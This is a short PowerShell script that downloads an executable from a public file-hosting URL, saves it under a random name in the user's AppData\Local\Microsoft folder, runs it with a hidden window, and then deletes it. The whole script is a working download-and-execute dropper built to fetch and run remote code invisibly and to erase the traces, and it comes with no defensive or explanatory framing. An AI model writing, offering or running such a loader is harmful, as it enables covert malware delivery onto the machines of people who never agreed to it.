$exeUrl = "http://tmpfiles.org/dl/1235390/messageboxtest.exe";
$tmpPath = "$env:USERPROFILE\AppData\Local\Microsoft\$(New-Guid).exe";

try {
    $wc = New-Object System.Net.WebClient;
    $wc.DownloadFile($exeUrl, $tmpPath);

    $p = Start-Process -FilePath $tmpPath -WindowStyle Hidden -PassThru;
    $p.WaitForExit();

    Remove-Item $tmpPath -Force -ErrorAction SilentlyContinue;
} catch {
    Write-Error "Execution failed: $_";
}


